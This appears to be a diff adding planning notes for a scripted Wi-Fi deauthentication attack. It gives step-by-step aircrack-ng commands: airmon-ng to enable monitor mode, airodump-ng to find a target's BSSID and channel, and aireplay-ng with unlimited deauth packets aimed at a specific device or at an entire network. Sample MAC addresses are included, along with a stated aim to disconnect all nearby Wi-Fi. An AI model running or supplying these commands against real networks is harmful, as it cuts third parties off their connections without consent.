@@ -1,0 +1,28 @@
+---------------------------Wifi-Deauth-Attack-----------------------------
+Steps:
+0) sudo service NetworkManager restart
+
+RECON PHASE:
+1) sudo airmon-ng start wlan0
+	-> Enter sudo password (already scripted)
+2) sudo iwconfig
+	-> parse through output to insure monitor mode is on (already scripted)
+3) sudo airodump-ng wlan0
+	-> **LEARN HOW to parse through dyniamic output**
+	-> Want to look for target ESSID, then gather BSSID and Channel # (colomn 1,4,14)
+	**(This is the challenging part and will determine how we want to implement our attack)**
+	**(need to write code to deauth ALL wifi and also if we are looking for a specific Wifi name (ESSID))
+
+ATTACK PHASE:
+Deauth Specific Device on Network:
+				      BSSID
+4) sudo airodump-ng wlan0 --bssid 6C:F3:7F:21:BD:62 --channel 6 
+				     device	 	 wifi BSSID
+5) sudo aireplay-ng --deauth 0 -c 58:6B:14:89:79:44 -a 6C:F3:7F:21:BD:62 wlan0
+
+
+Deauth Entire Network:
+4) sudo aireplay-ng --deauth 0 -a 6C:F3:7F:21:BD:62 wlan0
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
